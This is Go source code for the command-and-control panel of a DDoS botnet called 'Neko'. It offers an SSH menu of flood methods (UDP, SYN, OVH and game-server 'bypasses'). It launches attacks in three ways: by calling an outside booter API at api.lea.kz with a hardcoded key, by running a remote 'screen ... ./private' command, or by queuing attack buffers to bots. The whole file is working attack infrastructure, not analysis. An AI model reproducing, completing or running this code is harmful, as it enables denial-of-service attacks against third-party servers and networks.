package main

import (
	"strings"
	"fmt"
	"github.com/gliderlabs/ssh"
	"strconv"
	"net/http"
	"net"
)
type nekoMethods struct {
    methodCommand       string
    methodDesc          string
}

var sshMethods map[string]nekoMethods = map[string]nekoMethods {

    "ovhssh": nekoMethods {
        "screen -dmS attack timeout ${time} ./private ${host}:${port}",
        "Neko's custom OVH bypass.",
    },

}
/*
               ╔═══════════════════════╗
               ║ - - M E T H O D S - - ║
 ╔═╦═══════════╬═══════════╦═══════════╬═══════════╦═╗
 ║A║ ovhudp    ║           ║ ovhneko   ║           ║R║
 ║P║ grexack   ║           ║           ║           ║A║
 ║I║ amp       ║           ║           ║           ║W║
 ╚═╣ udpbypass ║           ║           ║           ╠═╝
   ║ icmp      ║           ║           ║           ║
   ║           ║           ║           ║           ║
   ║           ║           ║           ║           ║
   ║           ║           ║           ║           ║
   ║           ║           ║           ║           ║
   ║           ║           ║           ║           ║
   ║           ║           ║           ║           ║
   ║           ║           ║           ║           ║
*/
var apiMethods map[string]nekoMethods = map[string]nekoMethods {

    "nfo": nekoMethods {
        "https://api.lea.kz/fbiVIP.php?key=neko427ddks&host=${host}&port=${port}&time=${time}&method=LKZ-NFO",
        "leakz api method",
    },
    "dominate": nekoMethods {
        "https://api.lea.kz/fbiVIP.php?key=neko427ddks&host=${host}&port=${port}&time=${time}&method=LKZ-DOMINATE",
        "leakz api method",
    },
    "openvpn": nekoMethods {
        "https://api.lea.kz/fbiVIP.php?key=neko427ddks&host=${host}&port=${port}&time=${time}&method=LKZ-OPENVPN",
        "leakz api method",
    },
    "mobile": nekoMethods {
        "https://api.lea.kz/fbiVIP.php?key=neko427ddks&host=${host}&port=${port}&time=${time}&method=LKZ-MOBILE",
        "leakz api method",
    },
    "syn": nekoMethods {
        "https://api.lea.kz/fbiVIP.php?key=neko427ddks&host=${host}&port=${port}&time=${time}&method=LKZ-SYN",
        "leakz api method",
    },
    "ts3": nekoMethods {
        "https://api.lea.kz/fbiVIP.php?key=neko427ddks&host=${host}&port=${port}&time=${time}&method=LKZ-TS3UDP",
        "leakz api method",
    },
    "udp": nekoMethods {
        "https://api.lea.kz/fbiVIP.php?key=neko427ddks&host=${host}&port=${port}&time=${time}&method=LKZ-UDP",
        "leakz api method",
    },
    "udpbypass": nekoMethods {
        "https://api.lea.kz/fbiVIP.php?key=neko427ddks&host=${host}&port=${port}&time=${time}&method=LKZ-UDPBYPASS",
        "leakz api method",
    },
    "game": nekoMethods {
        "https://api.lea.kz/fbiVIP.php?key=neko427ddks&host=${host}&port=${port}&time=${time}&method=LKZ-GAME",
        "leakz api method",
    },
    "fivem": nekoMethods {
        "https://api.lea.kz/fbiVIP.php?key=neko427ddks&host=${host}&port=${port}&time=${time}&method=LKZ-FIVEM",
        "leakz api method",
    },
    "ovh": nekoMethods {
        "https://api.lea.kz/fbiVIP.php?key=neko427ddks&host=${host}&port=${port}&time=${time}&method=LKZ-OVHAMP",
        "leakz api method",
    },
    "tcp": nekoMethods {
        "https://api.lea.kz/fbiVIP.php?key=neko427ddks&host=${host}&port=${port}&time=${time}&method=LKZ-TCP",
        "leakz api method",
    },
    "udpv2": nekoMethods {
        "https://api.lea.kz/fbiVIP.php?key=neko427ddks&host=${host}&port=${port}&time=${time}&method=LKZ-UDP2",
        "leakz api method",
    },
    "dstat": nekoMethods {
        "https://api.lea.kz/fbiVIP.php?key=neko427ddks&host=${host}&port=${port}&time=${time}&method=LKZ-DSTAT",
        "leakz api method",
    },
    "home": nekoMethods {
        "https://api.lea.kz/fbiVIP.php?key=neko427ddks&host=${host}&port=${port}&time=${time}&method=LKZ-HOME",
        "leakz api method",
    },
    "cod": nekoMethods {
        "https://api.lea.kz/fbiVIP.php?key=neko427ddks&host=${host}&port=${port}&time=${time}&method=LKZ-COD",
        "leakz api method",
    },

}

func amethods(P string,
             D string,
             G string,
             B string) (string) {
	printis := "\r\n"+
"\x1b[38;5;242m               "+P+"HOME           "+D+"GAME          "+G+"BYPASSES        "+B+"MISC\r\n"+
"\x1b[38;5;242m          ╔═════════════╗╔═════════════╗╔═════════════╗╔═════════════╗\r\n"+
"\x1b[38;5;242m          ║ "+P+"LKZ-UDPV1\x1b[38;5;242m.. ║║ "+D+"LKZ-FIVEMU\x1b[38;5;242m. ║║ "+G+"UDPBYPASS\x1b[38;5;242m.. ║║ "+B+"LKZ-TS3U\x1b[38;5;242m... ║\r\n"+
"\x1b[38;5;242m          ║ "+P+"LKZ-UDPV2\x1b[38;5;242m.. ║║ "+D+"\x1b[38;5;242m........... ║║ "+G+"TCPBYPASS\x1b[38;5;242m.. ║║ "+B+"LKZ-MOBILE\x1b[38;5;242m. ║\r\n"+
"\x1b[38;5;242m          ║ "+P+"LKZ-AMP\x1b[38;5;242m.... ║║ "+D+"\x1b[38;5;242m........... ║║ "+G+"LKZ-NFOUV1\x1b[38;5;242m. ║║ "+B+"LKZ-DCCP\x1b[38;5;242m... ║\r\n"+
"\x1b[38;5;242m          ║ "+P+"LKZ-UDPEAT\x1b[38;5;242m. ║║ "+D+"\x1b[38;5;242m........... ║║ "+G+"LKZ-OPENVPN\x1b[38;5;242m ║║ "+B+"LKZ-GREXACK\x1b[38;5;242m ║\r\n"+
"\x1b[38;5;242m          ║ "+P+"LKZ-TCPALL\x1b[38;5;242m. ║║ "+D+"\x1b[38;5;242m........... ║║ "+G+"LKZ-NFOGSRV\x1b[38;5;242m ║║ "+B+"\x1b[38;5;242m........... ║\r\n"+
"\x1b[38;5;242m          ║ "+P+"LKZ-ICMP\x1b[38;5;242m... ║║ "+D+"\x1b[38;5;242m........... ║║ "+G+"LKZ-OVHTV1\x1b[38;5;242m. ║║ "+B+"\x1b[38;5;242m........... ║\r\n"+
"\x1b[38;5;242m          ║ "+P+"\x1b[38;5;242m........... ║║ "+D+"\x1b[38;5;242m........... ║║ "+G+"LKZ-OVHTV2\x1b[38;5;242m. ║║ "+B+"\x1b[38;5;242m........... ║\r\n"+
"\x1b[38;5;242m          ║ "+P+"\x1b[38;5;242m........... ║║ "+D+"\x1b[38;5;242m........... ║║ "+G+"LKZ-NFOGSRV\x1b[38;5;242m ║║ "+B+"\x1b[38;5;242m........... ║\r\n"+
"\x1b[38;5;242m          ║ "+P+"\x1b[38;5;242m........... ║║ "+D+"\x1b[38;5;242m........... ║║ "+G+"\x1b[38;5;242m........... ║║ "+B+"\x1b[38;5;242m........... ║\r\n"+
"\x1b[38;5;242m          ╚═════════════╝╚═════════════╝╚═════════════╝╚═════════════╝\r\n"
	return printis
}

func bmethods(P string,
             D string,
             G string,
             B string) (string) {
	printis := "\r\n"+
"\x1b[38;5;242m                "+P+"UDP            "+D+"TCP           "+G+"LAYER3         "+B+"NEKO\r\n"+
"\x1b[38;5;242m          ╔═════════════╗╔═════════════╗╔═════════════╗╔═════════════╗\r\n"+
"\x1b[38;5;242m          ║ "+G+"UDP\x1b[38;5;242m........ ║║ "+G+"ACK\x1b[38;5;242m........ ║║ "+G+"GREIP\x1b[38;5;242m...... ║║ "+B+"TCPHEX\x1b[38;5;242m..... ║\r\n"+
"\x1b[38;5;242m          ║ "+G+"STDHEX\x1b[38;5;242m..... ║║ "+D+"SYNHOME\x1b[38;5;242m.... ║║ "+G+"GREETH\x1b[38;5;242m..... ║║ "+B+"VSEHEX\x1b[38;5;242m..... ║\r\n"+
"\x1b[38;5;242m          ║ "+G+"UDPGAME\x1b[38;5;242m.... ║║ "+D+"SYN\x1b[38;5;242m........ ║║ "+G+"\x1b[38;5;242m........... ║║ "+B+"UDPBYPASS\x1b[38;5;242m.. ║\r\n"+
"\x1b[38;5;242m          ║ "+G+"VSE\x1b[38;5;242m........ ║║ "+D+"FRAG\x1b[38;5;242m....... ║║ "+G+"\x1b[38;5;242m........... ║║ "+B+"OVH\x1b[38;5;242m........ ║\r\n"+
"\x1b[38;5;242m          ║ "+G+"\x1b[38;5;242m........... ║║ "+D+"TCPALL\x1b[38;5;242m..... ║║ "+G+"\x1b[38;5;242m........... ║║ "+B+"OVHUDP\x1b[38;5;242m..... ║\r\n"+
"\x1b[38;5;242m          ║ "+G+"\x1b[38;5;242m........... ║║ "+D+"XMAS\x1b[38;5;242m....... ║║ "+G+"\x1b[38;5;242m........... ║║ "+B+"\x1b[38;5;242m........... ║\r\n"+
"\x1b[38;5;242m          ║ "+P+"\x1b[38;5;242m........... ║║ "+D+"STOMP\x1b[38;5;242m...... ║║ "+G+"\x1b[38;5;242m........... ║║ "+B+"\x1b[38;5;242m........... ║\r\n"+
"\x1b[38;5;242m          ║ "+P+"\x1b[38;5;242m........... ║║ "+D+"\x1b[38;5;242m........... ║║ "+G+"\x1b[38;5;242m........... ║║ "+B+"\x1b[38;5;242m........... ║\r\n"+
"\x1b[38;5;242m          ║ "+P+"\x1b[38;5;242m........... ║║ "+D+"\x1b[38;5;242m........... ║║ "+G+"\x1b[38;5;242m........... ║║ "+B+"\x1b[38;5;242m........... ║\r\n"+
"\x1b[38;5;242m          ╚═════════════╝╚═════════════╝╚═════════════╝╚═════════════╝\r\n\n"
	return printis
}

func parseSent(host string, port string, time string, method string, block string) (string) {
	attackArgs := map[string]string {

        "${host}": 
        	host,
        "${port}": 
        	port,
        "${time}": 
        	time,
        "${method}": 
        	method,

    }

    for oldChar, newChar := range attackArgs {
		block = strings.ReplaceAll(block, oldChar, newChar)
	}
	return block
}

func parseAttack(
			 username string,
			 P string,
             D string,
             G string,
             B string,
	host string, port string, time string, method string) (string) {
	attackArgs := map[string]string {

        "${host}": 
        	host,
        "${port}": 
        	port,
        "${time}": 
        	time,
        "${method}": 
        	method,

    }

    attackSent := termFx(username,P, D, G, B,assetFetch("attack"))

    for oldChar, newChar := range attackArgs {
		attackSent = strings.ReplaceAll(attackSent, oldChar, newChar)
	}
	return attackSent
}

func apisending(
		     P string,
             D string,
             G string,
             B string,
             s ssh.Session, 
             command string) {
	cmdsplit := strings.Split(command, " ")
	if len(cmdsplit) != 5{
		fmt.Fprint(s, "\x1b[0mNeko╼➤   Missing args!\n")
        return
	}
	_ = cmdsplit[0]
	host := cmdsplit[1]
	port := cmdsplit[2]
	time := cmdsplit[3]
	method := cmdsplit[4]
    var exists bool
    var apiInfo nekoMethods
    apiInfo, exists = apiMethods[method]
    if !exists {
    	fmt.Fprint(s, "\x1b[0mNeko╼➤   Attack "+method+" not fount!\n")
        return
    }
    timeint, err := strconv.Atoi(time)
    if err != nil {
        fmt.Fprint(s, "\x1b[0mNeko╼➤   TIme must be a number!\n")
        return
    }
    portint, err := strconv.Atoi(port)
    if err != nil {
        fmt.Fprint(s, "\x1b[0mNeko╼➤   Port must be a number!\n")
        return
    }
    ip := net.ParseIP(host)
        if ip == nil {
        fmt.Fprint(s, "\x1b[0mNeko╼➤   "+host+" is not an ip address!\n")
        return
    }
    if portint > 65535 || portint < 1 {
        fmt.Fprint(s, "\x1b[0mNeko╼➤   ports must be between 1 and 65535!\n")
        return
    }
    //func (this *Database) CanLaunchAttack(username string, duration uint32, fullCommand string, maxBots int, allowConcurrent int) (bool, error) {


    attackSent := termFx(s.User(), P, D, G, B, assetFetch("attack"))

    attackSent = parseAttack(s.User(),P, D, G, B,host,port,time,method)

	myCommand := apiInfo.methodCommand
	myCommand = parseSent(host, port, time, method, myCommand)
    if can, err := database.CanLaunchApi(s.User(), uint32(timeint), host, 0, 0); !can {
        fmt.Fprint(s,"\x1b[0m"+err.Error()+"\n")
        return
    } 
    _, err = http.Get(myCommand)
    if err != nil {
        fmt.Fprint(s, "\x1b[0mNeko╼➤   API error!\n")
        return
    }
	fmt.Fprint(s, attackSent)
    
	return
}

func sshsending(
		     P string,
             D string,
             G string,
             B string,
             s ssh.Session, 
             command string) {
	cmdsplit := strings.Split(command, " ")
	if len(cmdsplit) != 5{
		fmt.Fprint(s, "\x1b[0mNeko╼➤   Missing args!\n")
        return
	}
	_ = cmdsplit[0]
	host := cmdsplit[1]
	port := cmdsplit[2]
	time := cmdsplit[3]
	method := cmdsplit[4]
    var exists bool
    var apiInfo nekoMethods
    apiInfo, exists = sshMethods[method]
    if !exists {
    	fmt.Fprint(s, "\x1b[0mNeko╼➤   Attack "+method+" not fount!\n")
        return
    }
    timeint, err := strconv.Atoi(time)
    if err != nil {
        fmt.Fprint(s, "\x1b[0mNeko╼➤   TIme must be a number!\n")
        return
    }
    portint, err := strconv.Atoi(port)
    if err != nil {
        fmt.Fprint(s, "\x1b[0mNeko╼➤   Port must be a number!\n")
        return
    }
    ip := net.ParseIP(host)
        if ip == nil {
        fmt.Fprint(s, "\x1b[0mNeko╼➤   "+host+" is not an ip address!\n")
        return
    }
    if portint > 65535 || portint < 1 {
        fmt.Fprint(s, "\x1b[0mNeko╼➤   ports must be between 1 and 65535!\n")
        return
    }
    //func (this *Database) CanLaunchAttack(username string, duration uint32, fullCommand string, maxBots int, allowConcurrent int) (bool, error) {


    attackSent := termFx(s.User(), P, D, G, B, assetFetch("attack"))

    attackSent = parseAttack(s.User(),P, D, G, B,host,port,time,method)

	myCommand := apiInfo.methodCommand
	myCommand = parseSent(host, port, time, method, myCommand)
    if can, err := database.CanLaunchAttack(s.User(), uint32(timeint), host, 0, 0); !can {
        fmt.Fprint(s,"\x1b[0m"+err.Error()+"\n")
        return
    } 
    _ = nekossh(myCommand)
    fmt.Printf("sending "+myCommand+"\n")
	fmt.Fprint(s, attackSent)
    
	return
}

func rawsending(
		     P string,
             D string,
             G string,
             B string,
             s ssh.Session, 
             command string) {
	cmdsplit := strings.Split(command, " ")
	if len(cmdsplit) != 5{
		fmt.Fprint(s, "\x1b[0mNeko╼➤   Missing args!\n")
        return
	}
	_ = cmdsplit[0]
	host := cmdsplit[1]
	port := cmdsplit[2]
	time := cmdsplit[3]
	method := cmdsplit[4]
    timeint, err := strconv.Atoi(time)
    if err != nil {
        fmt.Fprint(s, "\x1b[0mNeko╼➤   TIme must be a number!\n")
        return
    }
    portint, err := strconv.Atoi(port)
    if err != nil {
        fmt.Fprint(s, "\x1b[0mNeko╼➤   Port must be a number!\n")
        return
    }
    ip := net.ParseIP(host)
        if ip == nil {
        fmt.Fprint(s, "\x1b[0mNeko╼➤   "+host+" is not an ip address!\n")
        return
    }
    if portint > 65535 || portint < 1 {
        fmt.Fprint(s, "\x1b[0mNeko╼➤   ports must be between 1 and 65535!\n")
        return
    }
    //func (this *Database) CanLaunchAttack(username string, duration uint32, fullCommand string, maxBots int, allowConcurrent int) (bool, error) {

    attackSent := termFx(s.User(), P, D, G, B, assetFetch("attack"))
    attackSent = parseAttack(s.User(),P, D, G, B,host,port,time,method)
    var botCatagory string
    cmd := method+" "+host+" "+time+" dport="+port
	atk, err := NewAttack(cmd, 0)
        if err != nil {
            fmt.Fprint(s,"\x1b[0m"+err.Error()+"\n")
        } else {
            buf, err := atk.Build()
            if err != nil {
                fmt.Fprint(s,"\x1b[0m"+err.Error()+"\n")
            } else {
                if can, err := database.CanLaunchAttack(s.User(), uint32(timeint), host, -1, 0); !can {
                    fmt.Fprint(s,"\x1b[0m"+err.Error()+"\n")
                } else if !database.ContainsWhitelistedTargets(atk) {
                    
                    clientList.QueueBuf(buf, -1, botCatagory)
                    fmt.Fprint(s, attackSent)
                } else {
                    fmt.Fprint(s,"\x1b[0mSorry this the netmask of this target is whitelisted \r\n")
                    //fmt.Println("Blocked Attack By " + username + " To Whitelisted Prefix")
                }
            }
        }
    
	return
}
/*
╔═══╗╔═════════════════════════════════════════════╗
║ N ║║ HOST: 255.255.255.255:65535                 ║         
║ E ║║ TIME:                                       ║
║ K ║║ METHOD:                                     ║
║ O ║║ COMMAND: METHODNAME SENT FOR AMOUNT         ║
╚═══╝╚═════════════════════════════════════════════╝

                    ╔╗╔  ╔════════════════════════╗
                    ║║║  ║ HOST: 255.255.255.255  ║
                    ╝╚╝  ╚════════════════════════╝
                    ┌─┐  ╔════════════════════════╗
                    ├┤   ║ PORT: 65535            ║
                    └─┘  ╚════════════════════════╝
                    ┬┌─  ╔════════════════════════╗
                    ├┴┐  ║ TIME:                  ║
                    ┴ ┴  ╚════════════════════════╝
                    ┌─┐  ╔════════════════════════╗
                    │ │  ║ METHOD:                ║
                    └─┘  ╚════════════════════════╝

*/